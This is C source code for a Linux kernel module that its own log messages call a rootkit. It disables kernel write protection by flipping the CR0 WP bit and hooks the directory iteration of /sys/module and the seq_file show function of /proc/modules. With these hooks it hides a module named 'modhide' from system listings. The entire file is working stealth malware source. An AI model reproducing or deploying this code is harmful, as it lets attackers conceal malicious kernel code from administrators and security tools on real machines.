#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");

#define ROOT_PATH "/sys/module"
#define PROC_PATH "/proc/modules"
#define SECRET_MODULE "modhide"

unsigned long * seq_show_addr;

int (*real_iterate)(struct file *filp, struct dir_context *ctx);

int fake_iterate(struct file *filp, struct dir_context *ctx);

int (*real_seq_show)(struct seq_file *seq, void *v);

int fake_seq_show(struct seq_file *seq, void *v);

int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);


static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    // prevent read from being reordered with respect to writes, use a dummy operand.
}

// the 16th bit of cr0 should be flipped if we want to change the memory info. 
static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "protected memory\n");
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

void hook_iterate(void) {                       
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", ROOT_PATH);          
    filp = filp_open(ROOT_PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
    real_iterate = f_op->iterate_shared;                              
                                                    
    unprotect_memory();                     
    f_op->iterate_shared = fake_iterate;               
    protect_memory();                      
                                
}

void hook_cleanupfile(void) {
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", ROOT_PATH);          
    filp = filp_open(ROOT_PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
                            
    unprotect_memory();                     
    f_op->iterate_shared = real_iterate;               
    protect_memory();            
}

int fake_iterate(struct file *filp, struct dir_context *ctx) {
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (strcmp(name, SECRET_MODULE) == 0) {
        printk(KERN_INFO "Hiding: %s\n", name);
        return 0;
    }

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}


void hook_show(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(PROC_PATH, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show;
    protect_memory();
}


void hook_cleanup(void) {
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show;
    protect_memory();
}

int fake_seq_show(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    last_count = seq->count;
    
    ret =  real_seq_show(seq, v);
    
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, SECRET_MODULE,
                last_size)) {
        printk(KERN_INFO "Hiding module: %s\n", SECRET_MODULE);
        seq->count -= last_size;
    }
    return ret;
}

static int __init mode_init(void) {
    printk(KERN_INFO "rootkit:init\n");
    hook_iterate();
    hook_show();
    return 0;
}

static void __exit mode_exit(void) {
    hook_cleanupfile();
    hook_cleanup();
    printk(KERN_INFO "rootkit:exit\n");
}

module_init(mode_init);
module_exit(mode_exit);